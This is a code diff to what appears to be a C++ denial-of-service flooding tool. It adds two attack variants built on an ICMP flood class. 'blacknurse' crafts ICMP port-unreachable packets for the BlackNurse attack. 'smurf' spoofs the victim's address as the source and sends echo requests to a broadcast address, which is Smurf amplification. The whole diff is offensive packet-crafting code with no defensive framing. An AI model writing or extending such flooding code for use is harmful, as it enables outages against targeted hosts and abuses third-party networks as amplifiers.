@@ -49,3 +49,21 @@ void icmp_flood::init_hdr(icmphdr *icmp, iphdr *ip) {
 void icmp_flood::finalize_hdr(icmphdr *icmp, iphdr *) {
   icmp->checksum = utils::csum((unsigned short *)icmp, sizeof(icmphdr));
 }
+
+blacknurse::blacknurse() : icmp_flood() {}
+
+void blacknurse::finalize_hdr(icmphdr *icmp, iphdr *ip) {
+  icmp->type = ICMP_DEST_UNREACH;
+  icmp->code = ICMP_PORT_UNREACH;
+  icmp_flood::finalize_hdr(icmp, ip);
+}
+
+smurf::smurf() : icmp_flood() {}
+
+void smurf::finalize_hdr(icmphdr *icmp, iphdr *ip) {
+  icmp->type = ICMP_ECHO;
+  icmp->code = ICMP_NET_UNREACH;
+  ip->daddr = inet_addr(Config::get().bcast.c_str());
+  ip->saddr = inet_addr(Config::get().rhost.c_str());
+  icmp_flood::finalize_hdr(icmp, ip);
+}
